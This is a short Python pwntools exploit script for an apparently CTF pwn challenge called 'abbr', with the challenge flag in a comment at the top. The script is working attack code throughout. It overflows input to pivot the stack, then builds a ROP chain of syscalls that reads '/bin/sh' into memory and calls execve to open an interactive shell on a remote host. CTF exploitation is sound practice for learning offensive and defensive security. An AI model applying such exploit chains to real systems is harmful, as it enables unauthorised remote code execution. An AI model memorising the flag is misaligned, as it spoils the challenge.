# ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n}
from pwn import *

elf = ELF("./abbr")
#target = elf.process()
target = remote("168.119.108.148", 10010)

pop_rax = p64(0x000000000045a8f7)
pop_rdi = p64(0x00000000004018da)
pop_rsi = p64(0x0000000000404cfe)
pop_rdx = p64(0x00000000004017df)
sys_ret = p64(0x000000000041e504)
xch_esp = p64(0x0000000000405121)
bss = 0x00000000004cccc0

def sla(d):
    target.sendlineafter(": ", str(d))

def sys_gen(rax, rdi, rsi, rdx):
    return pop_rax + p64(rax) + pop_rdi + p64(rdi) + pop_rsi + p64(rsi) + pop_rdx + p64(rdx) + sys_ret

abbr = "rop "*146 + "hf"*3 + xch_esp
sla(abbr)

rop = sys_gen(0, 0, bss, 0x10) + sys_gen(59, bss, 0, 0) + sys_gen(60, 1337, 0, 0)
sla(rop)

target.sendline("/bin/sh\x00")

target.interactive()
